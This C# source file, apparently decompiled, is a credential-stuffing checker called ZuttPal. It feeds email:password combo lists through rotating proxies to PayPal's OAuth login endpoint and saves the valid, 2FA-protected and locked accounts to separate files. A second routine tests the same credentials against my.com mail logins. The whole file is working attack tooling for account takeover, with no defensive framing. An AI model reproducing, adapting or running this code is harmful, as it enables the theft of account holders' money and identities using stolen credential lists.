using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Zuttpal;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	// Token: 0x02000009 RID: 9
	internal class check
	{ 
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();

		// Token: 0x0600002E RID: 46
		public static void startchecker()
		{
			for (; ; )
			{
				{
					while (!Checking.Combo.IsEmpty)
					{
						using (HttpRequest httpRequest = new HttpRequest())
					    {
					    	if (Checking.Combo.TryDequeue(out string acc))
					    	{ 
					    		try
					    		{
					    			string str = check.RandomAuth().Split(':', ';', '|')[0];
					    			string str2 = check.RandomAuth().Split(':', ';', '|')[1];
					    			string str3 = check.RandomAuth().Split(':', ';', '|')[2];
					    			string text = str2 + ":" + str3;
					    			var array = acc.Split(new char[3] { ':', ';', '|' });
					    			var email = array[0];
					    			var password = array[1];
					    			string account = email + ":" + password;
					    			httpRequest.Proxy = Checking.RandomProxies();
					    			httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
					    			httpRequest.AddHeader("Accept", "application/json");
					    			httpRequest.AddHeader("Authorization", "Basic " + str);
					    			httpRequest.AddHeader("Cache-control", "no-cache");
					    			httpRequest.IgnoreProtocolErrors = true;
					    			httpRequest.AllowAutoRedirect = true;
					    			httpRequest.KeepAliveTimeout = Program.config.timeout;
					    			httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
					    			byte[] bytes = Encoding.ASCII.GetBytes(string.Concat(new string[]
					    		{
					    		"customerIdentifier&deviceIdentifier=&email=",
					    		email,
					    		"&password=",
					    		password,
					    		"&response_type=token&rememberme=false&grant_type=password&redirect_uri=",
					    		text
					    		}));
					    			string yes = email + ":" + password;
					    			HttpResponse httpResponse = httpRequest.Post("https://api-m.paypal.com/v1/oauth2/login", bytes, "application/x-www-form-urlencoded");
					    			var key = httpResponse.ToString();
					    			if (key.Contains("stepup_required") || key.Contains("2fa_required"))
					    			{
					    				Interlocked.Increment(ref Checking.CheckedLines);
					    				Interlocked.Increment(ref Checking.currentCpm);
					    				Interlocked.Increment(ref Checking.twofa);
					    				if (Program.config.print2fa == "True")
					    				{
					    					Colorful.Console.WriteLine($"[»] 2FA - {yes}", Color.Yellow);
					    				}
					    				ResultsSaver.Save(Path + "\\2FA.txt", account);
					    			}
					    			else if (key.Contains("max_attempts_exceeded") || key.Contains("locked_user"))
					    			{
					    				Interlocked.Increment(ref Checking.CheckedLines);
					    				Interlocked.Increment(ref Checking.currentCpm);
					    				Interlocked.Increment(ref Checking.custom);
					    				if (Program.config.printlocked == "True")
					    				{
					    					Colorful.Console.WriteLine($"[»] Locked - {yes}", Color.Cyan);
					    				}
					    				ResultsSaver.Save(Path + "\\LOCKED.txt", account);
					    			}
					    			else if (key.Contains("RATE_LIMIT_REACHED") || key.Contains("unknown domain") || key.Contains("The page you are trying to access does not exist") || key.Contains("Error 404") || key.Contains("403 Forbidden") || key.Contains("Forbidden") || key.Contains("405 Not Allowed") || key.Contains("404 Not Found") || key.Contains("INTERNAL_SERVER_ERROR") || string.IsNullOrEmpty(key))
					    			{
					    				string acc1 = email + ":" + password;
					    				Checking.Combo.Enqueue(acc1);
					    				Interlocked.Increment(ref Checking.retry);
					    			}
					    			else if (key.Contains("scope"))
					    			{
					    				Interlocked.Increment(ref Checking.CheckedLines);
					    				Interlocked.Increment(ref Checking.currentCpm);
					    				Interlocked.Increment(ref Checking.Hits);
					    				if (Program.config.printgood == "True")
					    				{
					    					Colorful.Console.WriteLine($"[»] Valid - {yes}", Color.Green);
                                        }
					    				ResultsSaver.Save(Path + "\\Hits.txt", account);
					    			}
					    			else if (key.Contains("{\"error\":\"invalid"))
					    			{
					    				Interlocked.Increment(ref Checking.CheckedLines);
					    				Interlocked.Increment(ref Checking.currentCpm);
					    				Interlocked.Increment(ref Checking.Bad);
					    				if (Program.config.printbad == "True")
					    				{
					    					Colorful.Console.WriteLine($"[»] Invalid - {yes}", Color.Red);
					    				}
					    				ResultsSaver.Save(Path + "\\Invalid.txt", account);
					    			}
					    			{
					    				string acc1 = email + ":" + password;
					    				Checking6.Combo.Enqueue(acc1);
					    				Interlocked.Increment(ref Checking6.retry);
					    			}
					    		}
					    		catch (Exception)
					    		{
					    			var array = acc.Split(new char[3] { ':', ';', '|' });
					    			var email = array[0];
					    			var password = array[1];
					    			string acc1 = email + ":" + password;
					    			Checking.Combo.Enqueue(acc1);
					    			Interlocked.Increment(ref Checking.Errors);
					    			break;
					    		}
					    	}
					    }
				}
			}
		}
		}


		private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.Proxy = Checking.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					Interlocked.Increment(ref Checking.Errors);
				}
			}
			return "";
		}

		// Token: 0x0400001E RID: 30
		public static string token = "";

		// Token: 0x0400001F RID: 31
		public static string uri = "";

		// Token: 0x04000020 RID: 32
		public static string auther = "";

		// Token: 0x04000021 RID: 33
		public static List<string> Tokens = new List<string>();

		// Token: 0x04000022 RID: 34
		public static List<string> Urls = new List<string>();

		// Token: 0x04000023 RID: 35
		public static List<string> Combo = new List<string>();

		public static List<string> Auther = new List<string>();

		public static string RandomAuth()
		{
			return check.Auther[new Random().Next(0, check.Auther.Count)];
		}


		// Token: 0x04000024 RID: 36
		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
